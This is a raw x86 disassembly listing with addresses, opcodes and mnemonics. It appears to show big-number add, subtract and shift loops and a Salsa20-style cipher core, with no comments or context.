  401c6f:	8b 51 30             	mov    0x30(%ecx),%edx
  401c72:	8b 59 34             	mov    0x34(%ecx),%ebx
  401c75:	8b 71 38             	mov    0x38(%ecx),%esi
  401c78:	8b 79 3c             	mov    0x3c(%ecx),%edi
  401c7b:	19 50 30             	sbb    %edx,0x30(%eax)
  401c7e:	19 58 34             	sbb    %ebx,0x34(%eax)
  401c81:	19 70 38             	sbb    %esi,0x38(%eax)
  401c84:	19 78 3c             	sbb    %edi,0x3c(%eax)
  401c87:	8b 51 40             	mov    0x40(%ecx),%edx
  401c8a:	8b 59 44             	mov    0x44(%ecx),%ebx
  401c8d:	8b 71 48             	mov    0x48(%ecx),%esi
  401c90:	8b 79 4c             	mov    0x4c(%ecx),%edi
  401c93:	19 50 40             	sbb    %edx,0x40(%eax)
  401c96:	19 58 44             	sbb    %ebx,0x44(%eax)
  401c99:	19 70 48             	sbb    %esi,0x48(%eax)
  401c9c:	19 78 4c             	sbb    %edi,0x4c(%eax)
  401c9f:	8b 51 50             	mov    0x50(%ecx),%edx
  401ca2:	8b 59 54             	mov    0x54(%ecx),%ebx
  401ca5:	8b 71 58             	mov    0x58(%ecx),%esi
  401ca8:	8b 79 5c             	mov    0x5c(%ecx),%edi
  401cab:	19 50 50             	sbb    %edx,0x50(%eax)
  401cae:	19 58 54             	sbb    %ebx,0x54(%eax)
  401cb1:	19 70 58             	sbb    %esi,0x58(%eax)
  401cb4:	19 78 5c             	sbb    %edi,0x5c(%eax)
  401cb7:	8b 51 60             	mov    0x60(%ecx),%edx
  401cba:	8b 59 64             	mov    0x64(%ecx),%ebx
  401cbd:	8b 71 68             	mov    0x68(%ecx),%esi
  401cc0:	8b 79 6c             	mov    0x6c(%ecx),%edi
  401cc3:	19 50 60             	sbb    %edx,0x60(%eax)
  401cc6:	19 58 64             	sbb    %ebx,0x64(%eax)
  401cc9:	19 70 68             	sbb    %esi,0x68(%eax)
  401ccc:	19 78 6c             	sbb    %edi,0x6c(%eax)
  401ccf:	8b 51 70             	mov    0x70(%ecx),%edx
  401cd2:	8b 59 74             	mov    0x74(%ecx),%ebx
  401cd5:	8b 71 78             	mov    0x78(%ecx),%esi
  401cd8:	8b 79 7c             	mov    0x7c(%ecx),%edi
  401cdb:	19 50 70             	sbb    %edx,0x70(%eax)
  401cde:	19 58 74             	sbb    %ebx,0x74(%eax)
  401ce1:	19 70 78             	sbb    %esi,0x78(%eax)
  401ce4:	19 78 7c             	sbb    %edi,0x7c(%eax)
  401ce7:	0f 83 c8 00 00 00    	jae    0x401db5
  401ced:	8b 85 6c ff ff ff    	mov    -0x94(%ebp),%eax
  401cf3:	8b 4d 10             	mov    0x10(%ebp),%ecx
  401cf6:	f8                   	clc
  401cf7:	8b 11                	mov    (%ecx),%edx
  401cf9:	8b 59 04             	mov    0x4(%ecx),%ebx
  401cfc:	8b 71 08             	mov    0x8(%ecx),%esi
  401cff:	8b 79 0c             	mov    0xc(%ecx),%edi
  401d02:	11 10                	adc    %edx,(%eax)
  401d04:	11 58 04             	adc    %ebx,0x4(%eax)
  401d07:	11 70 08             	adc    %esi,0x8(%eax)
  401d0a:	11 78 0c             	adc    %edi,0xc(%eax)
  401d0d:	8b 51 10             	mov    0x10(%ecx),%edx
  401d10:	8b 59 14             	mov    0x14(%ecx),%ebx
  401d13:	8b 71 18             	mov    0x18(%ecx),%esi
  401d16:	8b 79 1c             	mov    0x1c(%ecx),%edi
  401d19:	11 50 10             	adc    %edx,0x10(%eax)
  401d1c:	11 58 14             	adc    %ebx,0x14(%eax)
  401d1f:	11 70 18             	adc    %esi,0x18(%eax)
  401d22:	11 78 1c             	adc    %edi,0x1c(%eax)
  401d25:	8b 51 20             	mov    0x20(%ecx),%edx
  401d28:	8b 59 24             	mov    0x24(%ecx),%ebx
  401d2b:	8b 71 28             	mov    0x28(%ecx),%esi
  401d2e:	8b 79 2c             	mov    0x2c(%ecx),%edi
  401d31:	11 50 20             	adc    %edx,0x20(%eax)
  401d34:	11 58 24             	adc    %ebx,0x24(%eax)
  401d37:	11 70 28             	adc    %esi,0x28(%eax)
  401d3a:	11 78 2c             	adc    %edi,0x2c(%eax)
  401d3d:	8b 51 30             	mov    0x30(%ecx),%edx
  401d40:	8b 59 34             	mov    0x34(%ecx),%ebx
  401d43:	8b 71 38             	mov    0x38(%ecx),%esi
  401d46:	8b 79 3c             	mov    0x3c(%ecx),%edi
  401d49:	11 50 30             	adc    %edx,0x30(%eax)
  401d4c:	11 58 34             	adc    %ebx,0x34(%eax)
  401d4f:	11 70 38             	adc    %esi,0x38(%eax)
  401d52:	11 78 3c             	adc    %edi,0x3c(%eax)
  401d55:	8b 51 40             	mov    0x40(%ecx),%edx
  401d58:	8b 59 44             	mov    0x44(%ecx),%ebx
  401d5b:	8b 71 48             	mov    0x48(%ecx),%esi
  401d5e:	8b 79 4c             	mov    0x4c(%ecx),%edi
  401d61:	11 50 40             	adc    %edx,0x40(%eax)
  401d64:	11 58 44             	adc    %ebx,0x44(%eax)
  401d67:	11 70 48             	adc    %esi,0x48(%eax)
  401d6a:	11 78 4c             	adc    %edi,0x4c(%eax)
  401d6d:	8b 51 50             	mov    0x50(%ecx),%edx
  401d70:	8b 59 54             	mov    0x54(%ecx),%ebx
  401d73:	8b 71 58             	mov    0x58(%ecx),%esi
  401d76:	8b 79 5c             	mov    0x5c(%ecx),%edi
  401d79:	11 50 50             	adc    %edx,0x50(%eax)
  401d7c:	11 58 54             	adc    %ebx,0x54(%eax)
  401d7f:	11 70 58             	adc    %esi,0x58(%eax)
  401d82:	11 78 5c             	adc    %edi,0x5c(%eax)
  401d85:	8b 51 60             	mov    0x60(%ecx),%edx
  401d88:	8b 59 64             	mov    0x64(%ecx),%ebx
  401d8b:	8b 71 68             	mov    0x68(%ecx),%esi
  401d8e:	8b 79 6c             	mov    0x6c(%ecx),%edi
  401d91:	11 50 60             	adc    %edx,0x60(%eax)
  401d94:	11 58 64             	adc    %ebx,0x64(%eax)
  401d97:	11 70 68             	adc    %esi,0x68(%eax)
  401d9a:	11 78 6c             	adc    %edi,0x6c(%eax)
  401d9d:	8b 51 70             	mov    0x70(%ecx),%edx
  401da0:	8b 59 74             	mov    0x74(%ecx),%ebx
  401da3:	8b 71 78             	mov    0x78(%ecx),%esi
  401da6:	8b 79 7c             	mov    0x7c(%ecx),%edi
  401da9:	11 50 70             	adc    %edx,0x70(%eax)
  401dac:	11 58 74             	adc    %ebx,0x74(%eax)
  401daf:	11 70 78             	adc    %esi,0x78(%eax)
  401db2:	11 78 7c             	adc    %edi,0x7c(%eax)
  401db5:	8b 45 08             	mov    0x8(%ebp),%eax
  401db8:	f8                   	clc
  401db9:	d1 10                	rcll   $1,(%eax)
  401dbb:	d1 50 04             	rcll   $1,0x4(%eax)
  401dbe:	d1 50 08             	rcll   $1,0x8(%eax)
  401dc1:	d1 50 0c             	rcll   $1,0xc(%eax)
  401dc4:	d1 50 10             	rcll   $1,0x10(%eax)
  401dc7:	d1 50 14             	rcll   $1,0x14(%eax)
  401dca:	d1 50 18             	rcll   $1,0x18(%eax)
  401dcd:	d1 50 1c             	rcll   $1,0x1c(%eax)
  401dd0:	d1 50 20             	rcll   $1,0x20(%eax)
  401dd3:	d1 50 24             	rcll   $1,0x24(%eax)
  401dd6:	d1 50 28             	rcll   $1,0x28(%eax)
  401dd9:	d1 50 2c             	rcll   $1,0x2c(%eax)
  401ddc:	d1 50 30             	rcll   $1,0x30(%eax)
  401ddf:	d1 50 34             	rcll   $1,0x34(%eax)
  401de2:	d1 50 38             	rcll   $1,0x38(%eax)
  401de5:	d1 50 3c             	rcll   $1,0x3c(%eax)
  401de8:	d1 50 40             	rcll   $1,0x40(%eax)
  401deb:	d1 50 44             	rcll   $1,0x44(%eax)
  401dee:	d1 50 48             	rcll   $1,0x48(%eax)
  401df1:	d1 50 4c             	rcll   $1,0x4c(%eax)
  401df4:	d1 50 50             	rcll   $1,0x50(%eax)
  401df7:	d1 50 54             	rcll   $1,0x54(%eax)
  401dfa:	d1 50 58             	rcll   $1,0x58(%eax)
  401dfd:	d1 50 5c             	rcll   $1,0x5c(%eax)
  401e00:	d1 50 60             	rcll   $1,0x60(%eax)
  401e03:	d1 50 64             	rcll   $1,0x64(%eax)
  401e06:	d1 50 68             	rcll   $1,0x68(%eax)
  401e09:	d1 50 6c             	rcll   $1,0x6c(%eax)
  401e0c:	d1 50 70             	rcll   $1,0x70(%eax)
  401e0f:	d1 50 74             	rcll   $1,0x74(%eax)
  401e12:	d1 50 78             	rcll   $1,0x78(%eax)
  401e15:	d1 50 7c             	rcll   $1,0x7c(%eax)
  401e18:	0f 83 c8 00 00 00    	jae    0x401ee6
  401e1e:	8b 85 6c ff ff ff    	mov    -0x94(%ebp),%eax
  401e24:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  401e27:	f8                   	clc
  401e28:	8b 11                	mov    (%ecx),%edx
  401e2a:	8b 59 04             	mov    0x4(%ecx),%ebx
  401e2d:	8b 71 08             	mov    0x8(%ecx),%esi
  401e30:	8b 79 0c             	mov    0xc(%ecx),%edi
  401e33:	11 10                	adc    %edx,(%eax)
  401e35:	11 58 04             	adc    %ebx,0x4(%eax)
  401e38:	11 70 08             	adc    %esi,0x8(%eax)
  401e3b:	11 78 0c             	adc    %edi,0xc(%eax)
  401e3e:	8b 51 10             	mov    0x10(%ecx),%edx
  401e41:	8b 59 14             	mov    0x14(%ecx),%ebx
  401e44:	8b 71 18             	mov    0x18(%ecx),%esi
  401e47:	8b 79 1c             	mov    0x1c(%ecx),%edi
  401e4a:	11 50 10             	adc    %edx,0x10(%eax)
  401e4d:	11 58 14             	adc    %ebx,0x14(%eax)
  401e50:	11 70 18             	adc    %esi,0x18(%eax)
  401e53:	11 78 1c             	adc    %edi,0x1c(%eax)
  401e56:	8b 51 20             	mov    0x20(%ecx),%edx
  401e59:	8b 59 24             	mov    0x24(%ecx),%ebx
  401e5c:	8b 71 28             	mov    0x28(%ecx),%esi
  401e5f:	8b 79 2c             	mov    0x2c(%ecx),%edi
  401e62:	11 50 20             	adc    %edx,0x20(%eax)
  401e65:	11 58 24             	adc    %ebx,0x24(%eax)
  401e68:	11 70 28             	adc    %esi,0x28(%eax)
  401e6b:	11 78 2c             	adc    %edi,0x2c(%eax)
  401e6e:	8b 51 30             	mov    0x30(%ecx),%edx
  401e71:	8b 59 34             	mov    0x34(%ecx),%ebx
  401e74:	8b 71 38             	mov    0x38(%ecx),%esi
  401e77:	8b 79 3c             	mov    0x3c(%ecx),%edi
  401e7a:	11 50 30             	adc    %edx,0x30(%eax)
  401e7d:	11 58 34             	adc    %ebx,0x34(%eax)
  401e80:	11 70 38             	adc    %esi,0x38(%eax)
  401e83:	11 78 3c             	adc    %edi,0x3c(%eax)
  401e86:	8b 51 40             	mov    0x40(%ecx),%edx
  401e89:	8b 59 44             	mov    0x44(%ecx),%ebx
  401e8c:	8b 71 48             	mov    0x48(%ecx),%esi
  401e8f:	8b 79 4c             	mov    0x4c(%ecx),%edi
  401e92:	11 50 40             	adc    %edx,0x40(%eax)
  401e95:	11 58 44             	adc    %ebx,0x44(%eax)
  401e98:	11 70 48             	adc    %esi,0x48(%eax)
  401e9b:	11 78 4c             	adc    %edi,0x4c(%eax)
  401e9e:	8b 51 50             	mov    0x50(%ecx),%edx
  401ea1:	8b 59 54             	mov    0x54(%ecx),%ebx
  401ea4:	8b 71 58             	mov    0x58(%ecx),%esi
  401ea7:	8b 79 5c             	mov    0x5c(%ecx),%edi
  401eaa:	11 50 50             	adc    %edx,0x50(%eax)
  401ead:	11 58 54             	adc    %ebx,0x54(%eax)
  401eb0:	11 70 58             	adc    %esi,0x58(%eax)
  401eb3:	11 78 5c             	adc    %edi,0x5c(%eax)
  401eb6:	8b 51 60             	mov    0x60(%ecx),%edx
  401eb9:	8b 59 64             	mov    0x64(%ecx),%ebx
  401ebc:	8b 71 68             	mov    0x68(%ecx),%esi
  401ebf:	8b 79 6c             	mov    0x6c(%ecx),%edi
  401ec2:	11 50 60             	adc    %edx,0x60(%eax)
  401ec5:	11 58 64             	adc    %ebx,0x64(%eax)
  401ec8:	11 70 68             	adc    %esi,0x68(%eax)
  401ecb:	11 78 6c             	adc    %edi,0x6c(%eax)
  401ece:	8b 51 70             	mov    0x70(%ecx),%edx
  401ed1:	8b 59 74             	mov    0x74(%ecx),%ebx
  401ed4:	8b 71 78             	mov    0x78(%ecx),%esi
  401ed7:	8b 79 7c             	mov    0x7c(%ecx),%edi
  401eda:	11 50 70             	adc    %edx,0x70(%eax)
  401edd:	11 58 74             	adc    %ebx,0x74(%eax)
  401ee0:	11 70 78             	adc    %esi,0x78(%eax)
  401ee3:	11 78 7c             	adc    %edi,0x7c(%eax)
  401ee6:	8b 85 6c ff ff ff    	mov    -0x94(%ebp),%eax
  401eec:	8b 4d 10             	mov    0x10(%ebp),%ecx
  401eef:	f8                   	clc
  401ef0:	8b 11                	mov    (%ecx),%edx
  401ef2:	8b 59 04             	mov    0x4(%ecx),%ebx
  401ef5:	8b 71 08             	mov    0x8(%ecx),%esi
  401ef8:	8b 79 0c             	mov    0xc(%ecx),%edi
  401efb:	19 10                	sbb    %edx,(%eax)
  401efd:	19 58 04             	sbb    %ebx,0x4(%eax)
  401f00:	19 70 08             	sbb    %esi,0x8(%eax)
  401f03:	19 78 0c             	sbb    %edi,0xc(%eax)
  401f06:	8b 51 10             	mov    0x10(%ecx),%edx
  401f09:	8b 59 14             	mov    0x14(%ecx),%ebx
  401f0c:	8b 71 18             	mov    0x18(%ecx),%esi
  401f0f:	8b 79 1c             	mov    0x1c(%ecx),%edi
  401f12:	19 50 10             	sbb    %edx,0x10(%eax)
  401f15:	19 58 14             	sbb    %ebx,0x14(%eax)
  401f18:	19 70 18             	sbb    %esi,0x18(%eax)
  401f1b:	19 78 1c             	sbb    %edi,0x1c(%eax)
  401f1e:	8b 51 20             	mov    0x20(%ecx),%edx
  401f21:	8b 59 24             	mov    0x24(%ecx),%ebx
  401f24:	8b 71 28             	mov    0x28(%ecx),%esi
  401f27:	8b 79 2c             	mov    0x2c(%ecx),%edi
  401f2a:	19 50 20             	sbb    %edx,0x20(%eax)
  401f2d:	19 58 24             	sbb    %ebx,0x24(%eax)
  401f30:	19 70 28             	sbb    %esi,0x28(%eax)
  401f33:	19 78 2c             	sbb    %edi,0x2c(%eax)
  401f36:	8b 51 30             	mov    0x30(%ecx),%edx
  401f39:	8b 59 34             	mov    0x34(%ecx),%ebx
  401f3c:	8b 71 38             	mov    0x38(%ecx),%esi
  401f3f:	8b 79 3c             	mov    0x3c(%ecx),%edi
  401f42:	19 50 30             	sbb    %edx,0x30(%eax)
  401f45:	19 58 34             	sbb    %ebx,0x34(%eax)
  401f48:	19 70 38             	sbb    %esi,0x38(%eax)
  401f4b:	19 78 3c             	sbb    %edi,0x3c(%eax)
  401f4e:	8b 51 40             	mov    0x40(%ecx),%edx
  401f51:	8b 59 44             	mov    0x44(%ecx),%ebx
  401f54:	8b 71 48             	mov    0x48(%ecx),%esi
  401f57:	8b 79 4c             	mov    0x4c(%ecx),%edi
  401f5a:	19 50 40             	sbb    %edx,0x40(%eax)
  401f5d:	19 58 44             	sbb    %ebx,0x44(%eax)
  401f60:	19 70 48             	sbb    %esi,0x48(%eax)
  401f63:	19 78 4c             	sbb    %edi,0x4c(%eax)
  401f66:	8b 51 50             	mov    0x50(%ecx),%edx
  401f69:	8b 59 54             	mov    0x54(%ecx),%ebx
  401f6c:	8b 71 58             	mov    0x58(%ecx),%esi
  401f6f:	8b 79 5c             	mov    0x5c(%ecx),%edi
  401f72:	19 50 50             	sbb    %edx,0x50(%eax)
  401f75:	19 58 54             	sbb    %ebx,0x54(%eax)
  401f78:	19 70 58             	sbb    %esi,0x58(%eax)
  401f7b:	19 78 5c             	sbb    %edi,0x5c(%eax)
  401f7e:	8b 51 60             	mov    0x60(%ecx),%edx
  401f81:	8b 59 64             	mov    0x64(%ecx),%ebx
  401f84:	8b 71 68             	mov    0x68(%ecx),%esi
  401f87:	8b 79 6c             	mov    0x6c(%ecx),%edi
  401f8a:	19 50 60             	sbb    %edx,0x60(%eax)
  401f8d:	19 58 64             	sbb    %ebx,0x64(%eax)
  401f90:	19 70 68             	sbb    %esi,0x68(%eax)
  401f93:	19 78 6c             	sbb    %edi,0x6c(%eax)
  401f96:	8b 51 70             	mov    0x70(%ecx),%edx
  401f99:	8b 59 74             	mov    0x74(%ecx),%ebx
  401f9c:	8b 71 78             	mov    0x78(%ecx),%esi
  401f9f:	8b 79 7c             	mov    0x7c(%ecx),%edi
  401fa2:	19 50 70             	sbb    %edx,0x70(%eax)
  401fa5:	19 58 74             	sbb    %ebx,0x74(%eax)
  401fa8:	19 70 78             	sbb    %esi,0x78(%eax)
  401fab:	19 78 7c             	sbb    %edi,0x7c(%eax)
  401fae:	0f 83 c8 00 00 00    	jae    0x40207c
  401fb4:	8b 85 6c ff ff ff    	mov    -0x94(%ebp),%eax
  401fba:	8b 4d 10             	mov    0x10(%ebp),%ecx
  401fbd:	f8                   	clc
  401fbe:	8b 11                	mov    (%ecx),%edx
  401fc0:	8b 59 04             	mov    0x4(%ecx),%ebx
  401fc3:	8b 71 08             	mov    0x8(%ecx),%esi
  401fc6:	8b 79 0c             	mov    0xc(%ecx),%edi
  401fc9:	11 10                	adc    %edx,(%eax)
  401fcb:	11 58 04             	adc    %ebx,0x4(%eax)
  401fce:	11 70 08             	adc    %esi,0x8(%eax)
  401fd1:	11 78 0c             	adc    %edi,0xc(%eax)
  401fd4:	8b 51 10             	mov    0x10(%ecx),%edx
  401fd7:	8b 59 14             	mov    0x14(%ecx),%ebx
  401fda:	8b 71 18             	mov    0x18(%ecx),%esi
  401fdd:	8b 79 1c             	mov    0x1c(%ecx),%edi
  401fe0:	11 50 10             	adc    %edx,0x10(%eax)
  401fe3:	11 58 14             	adc    %ebx,0x14(%eax)
  401fe6:	11 70 18             	adc    %esi,0x18(%eax)
  401fe9:	11 78 1c             	adc    %edi,0x1c(%eax)
  401fec:	8b 51 20             	mov    0x20(%ecx),%edx
  401fef:	8b 59 24             	mov    0x24(%ecx),%ebx
  401ff2:	8b 71 28             	mov    0x28(%ecx),%esi
  401ff5:	8b 79 2c             	mov    0x2c(%ecx),%edi
  401ff8:	11 50 20             	adc    %edx,0x20(%eax)
  401ffb:	11 58 24             	adc    %ebx,0x24(%eax)
  401ffe:	11 70 28             	adc    %esi,0x28(%eax)
  402001:	11 78 2c             	adc    %edi,0x2c(%eax)
  402004:	8b 51 30             	mov    0x30(%ecx),%edx
  402007:	8b 59 34             	mov    0x34(%ecx),%ebx
  40200a:	8b 71 38             	mov    0x38(%ecx),%esi
  40200d:	8b 79 3c             	mov    0x3c(%ecx),%edi
  402010:	11 50 30             	adc    %edx,0x30(%eax)
  402013:	11 58 34             	adc    %ebx,0x34(%eax)
  402016:	11 70 38             	adc    %esi,0x38(%eax)
  402019:	11 78 3c             	adc    %edi,0x3c(%eax)
  40201c:	8b 51 40             	mov    0x40(%ecx),%edx
  40201f:	8b 59 44             	mov    0x44(%ecx),%ebx
  402022:	8b 71 48             	mov    0x48(%ecx),%esi
  402025:	8b 79 4c             	mov    0x4c(%ecx),%edi
  402028:	11 50 40             	adc    %edx,0x40(%eax)
  40202b:	11 58 44             	adc    %ebx,0x44(%eax)
  40202e:	11 70 48             	adc    %esi,0x48(%eax)
  402031:	11 78 4c             	adc    %edi,0x4c(%eax)
  402034:	8b 51 50             	mov    0x50(%ecx),%edx
  402037:	8b 59 54             	mov    0x54(%ecx),%ebx
  40203a:	8b 71 58             	mov    0x58(%ecx),%esi
  40203d:	8b 79 5c             	mov    0x5c(%ecx),%edi
  402040:	11 50 50             	adc    %edx,0x50(%eax)
  402043:	11 58 54             	adc    %ebx,0x54(%eax)
  402046:	11 70 58             	adc    %esi,0x58(%eax)
  402049:	11 78 5c             	adc    %edi,0x5c(%eax)
  40204c:	8b 51 60             	mov    0x60(%ecx),%edx
  40204f:	8b 59 64             	mov    0x64(%ecx),%ebx
  402052:	8b 71 68             	mov    0x68(%ecx),%esi
  402055:	8b 79 6c             	mov    0x6c(%ecx),%edi
  402058:	11 50 60             	adc    %edx,0x60(%eax)
  40205b:	11 58 64             	adc    %ebx,0x64(%eax)
  40205e:	11 70 68             	adc    %esi,0x68(%eax)
  402061:	11 78 6c             	adc    %edi,0x6c(%eax)
  402064:	8b 51 70             	mov    0x70(%ecx),%edx
  402067:	8b 59 74             	mov    0x74(%ecx),%ebx
  40206a:	8b 71 78             	mov    0x78(%ecx),%esi
  40206d:	8b 79 7c             	mov    0x7c(%ecx),%edi
  402070:	11 50 70             	adc    %edx,0x70(%eax)
  402073:	11 58 74             	adc    %ebx,0x74(%eax)
  402076:	11 70 78             	adc    %esi,0x78(%eax)
  402079:	11 78 7c             	adc    %edi,0x7c(%eax)
  40207c:	ff 8d 68 ff ff ff    	decl   -0x98(%ebp)
  402082:	83 bd 68 ff ff ff 00 	cmpl   $0x0,-0x98(%ebp)
  402089:	75 02                	jne    0x40208d
  40208b:	eb 05                	jmp    0x402092
  40208d:	e9 27 fb ff ff       	jmp    0x401bb9
  402092:	8b 85 6c ff ff ff    	mov    -0x94(%ebp),%eax
  402098:	8b 55 08             	mov    0x8(%ebp),%edx
  40209b:	b9 08 00 00 00       	mov    $0x8,%ecx
  4020a0:	66 0f 6f 00          	movdqa (%eax),%xmm0
  4020a4:	66 0f 7f 02          	movdqa %xmm0,(%edx)
  4020a8:	83 c0 10             	add    $0x10,%eax
  4020ab:	83 c2 10             	add    $0x10,%edx
  4020ae:	49                   	dec    %ecx
  4020af:	85 c9                	test   %ecx,%ecx
  4020b1:	75 ed                	jne    0x4020a0
  4020b3:	5f                   	pop    %edi
  4020b4:	5e                   	pop    %esi
  4020b5:	5b                   	pop    %ebx
  4020b6:	8b e5                	mov    %ebp,%esp
  4020b8:	5d                   	pop    %ebp
  4020b9:	c2 0c 00             	ret    $0xc
  4020bc:	81 ec 84 00 00 00    	sub    $0x84,%esp
  4020c2:	8b 94 24 88 00 00 00 	mov    0x88(%esp),%edx
  4020c9:	56                   	push   %esi
  4020ca:	8b b4 24 94 00 00 00 	mov    0x94(%esp),%esi
  4020d1:	89 74 24 3c          	mov    %esi,0x3c(%esp)
  4020d5:	57                   	push   %edi
  4020d6:	8b bc 24 94 00 00 00 	mov    0x94(%esp),%edi
  4020dd:	89 7c 24 34          	mov    %edi,0x34(%esp)
  4020e1:	85 d2                	test   %edx,%edx
  4020e3:	0f 84 fb 03 00 00    	je     0x4024e4
  4020e9:	53                   	push   %ebx
  4020ea:	8d 46 3c             	lea    0x3c(%esi),%eax
  4020ed:	55                   	push   %ebp
  4020ee:	89 44 24 4c          	mov    %eax,0x4c(%esp)
  4020f2:	0f 10 06             	movups (%esi),%xmm0
  4020f5:	c7 44 24 40 0a 00 00 	movl   $0xa,0x40(%esp)
  4020fc:	00 
  4020fd:	0f 11 44 24 50       	movups %xmm0,0x50(%esp)
  402102:	0f 10 46 10          	movups 0x10(%esi),%xmm0
  402106:	0f 11 44 24 60       	movups %xmm0,0x60(%esp)
  40210b:	0f 10 46 20          	movups 0x20(%esi),%xmm0
  40210f:	0f 11 44 24 70       	movups %xmm0,0x70(%esp)
  402114:	8b 44 24 78          	mov    0x78(%esp),%eax
  402118:	0f 10 46 30          	movups 0x30(%esi),%xmm0
  40211c:	8b 54 24 7c          	mov    0x7c(%esp),%edx
  402120:	8b 74 24 60          	mov    0x60(%esp),%esi
  402124:	89 44 24 30          	mov    %eax,0x30(%esp)
  402128:	8b 44 24 74          	mov    0x74(%esp),%eax
  40212c:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  402130:	8b 44 24 70          	mov    0x70(%esp),%eax
  402134:	89 44 24 20          	mov    %eax,0x20(%esp)
  402138:	8b 44 24 6c          	mov    0x6c(%esp),%eax
  40213c:	89 44 24 18          	mov    %eax,0x18(%esp)
  402140:	8b 44 24 68          	mov    0x68(%esp),%eax
  402144:	89 44 24 14          	mov    %eax,0x14(%esp)
  402148:	8b 44 24 64          	mov    0x64(%esp),%eax
  40214c:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  402150:	8b 44 24 5c          	mov    0x5c(%esp),%eax
  402154:	89 44 24 10          	mov    %eax,0x10(%esp)
  402158:	8b 44 24 58          	mov    0x58(%esp),%eax
  40215c:	89 44 24 24          	mov    %eax,0x24(%esp)
  402160:	8b 44 24 54          	mov    0x54(%esp),%eax
  402164:	0f 11 84 24 80 00 00 	movups %xmm0,0x80(%esp)
  40216b:	00 
  40216c:	8b 8c 24 8c 00 00 00 	mov    0x8c(%esp),%ecx
  402173:	8b 9c 24 88 00 00 00 	mov    0x88(%esp),%ebx
  40217a:	8b ac 24 84 00 00 00 	mov    0x84(%esp),%ebp
  402181:	8b bc 24 80 00 00 00 	mov    0x80(%esp),%edi
  402188:	89 44 24 34          	mov    %eax,0x34(%esp)
  40218c:	8b 44 24 50          	mov    0x50(%esp),%eax
  402190:	89 44 24 28          	mov    %eax,0x28(%esp)
  402194:	eb 04                	jmp    0x40219a
  402196:	8b 74 24 38          	mov    0x38(%esp),%esi
  40219a:	03 c7                	add    %edi,%eax
  40219c:	c1 c0 07             	rol    $0x7,%eax
  40219f:	33 f0                	xor    %eax,%esi
  4021a1:	8b 44 24 28          	mov    0x28(%esp),%eax
  4021a5:	03 c6                	add    %esi,%eax
  4021a7:	89 74 24 38          	mov    %esi,0x38(%esp)
  4021ab:	c1 c0 09             	rol    $0x9,%eax
  4021ae:	31 44 24 20          	xor    %eax,0x20(%esp)
  4021b2:	8b 44 24 20          	mov    0x20(%esp),%eax
  4021b6:	03 c6                	add    %esi,%eax
  4021b8:	8b 74 24 34          	mov    0x34(%esp),%esi
  4021bc:	c1 c0 0d             	rol    $0xd,%eax
  4021bf:	33 f8                	xor    %eax,%edi
  4021c1:	8b 44 24 20          	mov    0x20(%esp),%eax
  4021c5:	03 c7                	add    %edi,%eax
  4021c7:	89 7c 24 44          	mov    %edi,0x44(%esp)
  4021cb:	c1 c8 0e             	ror    $0xe,%eax
  4021ce:	31 44 24 28          	xor    %eax,0x28(%esp)
  4021d2:	8b 7c 24 2c          	mov    0x2c(%esp),%edi
  4021d6:	8d 04 3e             	lea    (%esi,%edi,1),%eax
  4021d9:	c1 c0 07             	rol    $0x7,%eax
  4021dc:	31 44 24 1c          	xor    %eax,0x1c(%esp)
  4021e0:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  4021e4:	03 c7                	add    %edi,%eax
  4021e6:	c1 c0 09             	rol    $0x9,%eax
  4021e9:	33 e8                	xor    %eax,%ebp
  4021eb:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  4021ef:	03 c5                	add    %ebp,%eax
  4021f1:	c1 c0 0d             	rol    $0xd,%eax
  4021f4:	33 f0                	xor    %eax,%esi
  4021f6:	89 74 24 34          	mov    %esi,0x34(%esp)
  4021fa:	8d 04 2e             	lea    (%esi,%ebp,1),%eax
  4021fd:	8b 74 24 30          	mov    0x30(%esp),%esi
  402201:	c1 c8 0e             	ror    $0xe,%eax
  402204:	33 f8                	xor    %eax,%edi
  402206:	8b 44 24 14          	mov    0x14(%esp),%eax
  40220a:	03 c6                	add    %esi,%eax
  40220c:	89 7c 24 2c          	mov    %edi,0x2c(%esp)
  402210:	c1 c0 07             	rol    $0x7,%eax
  402213:	33 d8                	xor    %eax,%ebx
  402215:	8b 7c 24 34          	mov    0x34(%esp),%edi
  402219:	8d 04 33             	lea    (%ebx,%esi,1),%eax
  40221c:	c1 c0 09             	rol    $0x9,%eax
  40221f:	31 44 24 24          	xor    %eax,0x24(%esp)
  402223:	8b 44 24 24          	mov    0x24(%esp),%eax
  402227:	03 c3                	add    %ebx,%eax
  402229:	c1 c0 0d             	rol    $0xd,%eax
  40222c:	31 44 24 14          	xor    %eax,0x14(%esp)
  402230:	8b 44 24 14          	mov    0x14(%esp),%eax
  402234:	03 44 24 24          	add    0x24(%esp),%eax
  402238:	c1 c8 0e             	ror    $0xe,%eax
  40223b:	33 f0                	xor    %eax,%esi
  40223d:	8d 04 0a             	lea    (%edx,%ecx,1),%eax
  402240:	c1 c0 07             	rol    $0x7,%eax
  402243:	31 44 24 10          	xor    %eax,0x10(%esp)
  402247:	8b 44 24 10          	mov    0x10(%esp),%eax
  40224b:	03 c1                	add    %ecx,%eax
  40224d:	89 74 24 30          	mov    %esi,0x30(%esp)
  402251:	8b 74 24 28          	mov    0x28(%esp),%esi
  402255:	c1 c0 09             	rol    $0x9,%eax
  402258:	31 44 24 18          	xor    %eax,0x18(%esp)
  40225c:	8b 44 24 18          	mov    0x18(%esp),%eax
  402260:	03 44 24 10          	add    0x10(%esp),%eax
  402264:	c1 c0 0d             	rol    $0xd,%eax
  402267:	33 d0                	xor    %eax,%edx
  402269:	8b 44 24 18          	mov    0x18(%esp),%eax
  40226d:	03 c2                	add    %edx,%eax
  40226f:	c1 c8 0e             	ror    $0xe,%eax
  402272:	33 c8                	xor    %eax,%ecx
  402274:	8b 44 24 10          	mov    0x10(%esp),%eax
  402278:	03 c6                	add    %esi,%eax
  40227a:	c1 c0 07             	rol    $0x7,%eax
  40227d:	33 f8                	xor    %eax,%edi
  40227f:	89 7c 24 34          	mov    %edi,0x34(%esp)
  402283:	89 7c 24 54          	mov    %edi,0x54(%esp)
  402287:	8d 04 37             	lea    (%edi,%esi,1),%eax
  40228a:	8b 74 24 24          	mov    0x24(%esp),%esi
  40228e:	c1 c0 09             	rol    $0x9,%eax
  402291:	33 f0                	xor    %eax,%esi
  402293:	89 74 24 24          	mov    %esi,0x24(%esp)
  402297:	89 74 24 58          	mov    %esi,0x58(%esp)
